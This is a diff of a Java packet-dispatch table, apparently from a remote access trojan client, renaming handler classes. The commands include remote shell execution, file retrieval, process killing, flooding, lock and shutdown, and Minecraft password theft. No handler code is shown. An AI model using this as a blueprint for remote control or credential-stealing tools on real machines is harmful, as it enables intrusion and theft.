@@ -23,11 +23,11 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put(/* "LISTPROCESS" */(byte) 19, Packet19ListProcesses.class);
 		incomingPackets.put(/* "KILLPROCESS" */(byte) 20, Packet20KillProcess.class);
 		incomingPackets.put(/* "GETFILE" */(byte) 21, Packet21GetFile.class);
-		incomingPackets.put(/* "FLOOD" */(byte) 22, PacketFLOOD.class);
+		incomingPackets.put(/* "FLOOD" */(byte) 22, Packet22Flood.class);
 		incomingPackets.put(/* "RUNCMD" */(byte) 23, Packet23RemoteShellStart.class);
-		incomingPackets.put(/* "ENDCMD" */(byte) 24, PacketENDCMD.class);
+		incomingPackets.put(/* "ENDCMD" */(byte) 24, Packet24RemoteShellStop.class);
 		incomingPackets.put(/* "EXEC" */(byte) 25, Packet25RemoteShellExecute.class);
-		incomingPackets.put(/* "EXECP" */(byte) 26, PacketEXECP.class);
+		// TODO 26 free 
 		incomingPackets.put(/* "REFRESHINFO" */(byte) 27, Packet27RefreshSystemInfo.class);
 		incomingPackets.put(/* "SHUTDOWN" */(byte) 28, Packet28ShutdownComputer.class);
 		incomingPackets.put(/* "RESTART" */(byte) 29, Packet29RestartComputer.class);
@@ -36,7 +36,7 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put(/* "LOCK" */(byte) 32, Packet32LockComputer.class);
 		incomingPackets.put(/* "GETRAM" */(byte) 33, Packet33RAM.class);
 		incomingPackets.put(/* "CUSTOMDL" */(byte) 34, Packet34AdvancedDownload.class);
-		incomingPackets.put(/* "SCRIPT" */(byte) 35, PacketSCRIPT.class);
+		incomingPackets.put(/* "SCRIPT" */(byte) 35, Packet35Script.class);
 		incomingPackets.put(/* "UNINSTALL" */(byte) 36, Packet36Uninstall.class);
 		incomingPackets.put(/* "RESTARTC" */(byte) 37, Packet37RestartJavaProcess.class);
 		incomingPackets.put(/* "REXEC" */(byte) 38, Packet38RunCommand.class);
@@ -53,7 +53,7 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put(/* "ENDCHAT" */(byte) 49, Packet49ChatEnd.class);
 		incomingPackets.put(/* "MC" */(byte) 50, Packet50MinecraftPassword.class);
 		incomingPackets.put(/* "CHAT" */(byte) 51, Packet51ChatMessage.class);
-		incomingPackets.put(/* "LOG" */(byte) 52, PacketLOG.class);
+		incomingPackets.put(/* "LOG" */(byte) 52, Packet52Log.class);
 		incomingPackets.put(/* "FIND" */(byte) 53, Packet53StartSearch.class);
 		incomingPackets.put(/* "EFIND" */(byte) 54, Packet54StopSearch.class);
 		incomingPackets.put(/* "GETHOSTFI" */(byte) 55, Packet55HostsFile.class);
